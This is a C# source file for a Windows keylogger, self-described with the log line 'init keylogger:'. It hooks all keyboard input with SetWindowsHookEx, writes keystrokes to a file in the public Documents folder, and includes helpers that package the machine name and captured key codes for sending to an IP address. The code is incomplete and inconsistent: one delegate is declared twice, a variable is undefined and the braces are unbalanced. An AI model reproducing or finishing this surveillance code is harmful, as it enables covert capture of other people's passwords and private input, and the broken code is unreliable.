using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

class InterceptKeys
{
  private static StreamWriter myfileStream;
  private const int WH_KEYBOARD_LL = 13;
  private const int WM_KEYDOWN = 0x0100;
  private const int WM_KEYUP = 0x0101;
  private bool shift;
  private bool ctrl;
  private bool alt;
  private bool altGr;
  private static LowLevelKeyboardProc _proc = HookCallback;
  private static IntPtr _hookID = IntPtr.Zero;
  private static readonly string myPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments),
        "myfile.txt");

  public static void Main()
  {
    try
    {
      myfileStream = new StreamWriter(myPath, true);
      String text = "init keylogger:";
      myfileStream.WriteLine(text.ToString());
      myfileStream.Close();
    }
    catch (Exception err)
    {
      Console.WriteLine(err.ToString());
    }
    _hookID = SetHook(_proc);
    Application.Run();
    UnhookWindowsHookEx(_hookID);
    myfileStream.WriteLine();
    myfileStream.Close();
  }

  private static IntPtr SetHook(LowLevelKeyboardProc proc)
  {
    using (ProcessModule curModule = Process.GetCurrentProcess().MainModule)
    {
      return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
    }
  }

  private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

  private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
  {

    using (myfileStream = new StreamWriter(myPath, true))
    {

      if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
      {
        /*Effettuare il controllo del tasto premuto:
               *  - se sequenza CTRL
               *  - se sequenza ALT
               *  - se sequenza Shift
               *  - tasto funzione.
               */
        //lParma is tha address in unmanaged memory from which to read
        int vkCode = Marshal.ReadInt32(lParam);
        var text = Marshal.PtrToStringAnsi(lParam);
        try
        {
          TraceLog(myfileStream, $"KEYDOWN - lParam: {lParam} - &lParam: {lParam} - ReadToInt: {vkCode} - PtrToString: {text}");
        }
        catch { }
      }
      //if (nCode >= 0 && wParam == (IntPtr)WM_KEYUP)
      //{
      //  int vkCode = Marshal.ReadInt32(lParam);
      //  var text = Marshal.PtrToStringAnsi(lParam);
      //  try
      //  {
      //    TraceLog(myfileStream, $"KEYUP - ReadToInt: {vkCode} - PtrToString: {text}");
      //  }
      //  catch { }
      //}
    }
    return CallNextHookEx(_hookID, nCode, wParam, lParam);
  }

		private static bool CheckNetwork(string ipAddress)
		{
			var pingSender = new Ping();
			var pingOptions = new PingOptions()
			{
				DontFragment = true,
			};
			string data = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
			byte[] buffer = Encoding.ASCII.GetBytes(data);
			var pingReplay = pingSender.Send(ipAddress,
				1200,
				buffer,
				pingOptions);
			return pingReplay.Status == IPStatus.Success;
		}

		private static byte[] DataToSend()
		{
			var pcName = $"{Environment.MachineName}-{DateTime.UtcNow}:".ToArray();

			var maxVkLenght = 1024 - pcName.Length - 1;
			var vkCodesArray = newValue.Take(maxVkLenght).Select(value => (char)value).ToArray();
			newValue.RemoveRange(0, maxVkLenght);
			var data = pcName.Concat(vkCodesArray).ToArray();
			var bytesToSend = Encoding.ASCII.GetBytes(data);
			return bytesToSend;
		}

		#region delegate
		private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

		private delegate void SendData(byte[] data, string ipAddress, bool forceResend = false);
		#endregion

		#region user32.dll import
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool UnhookWindowsHookEx(IntPtr hhk);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr GetModuleHandle(string lpModuleName);
		#endregion

	}
}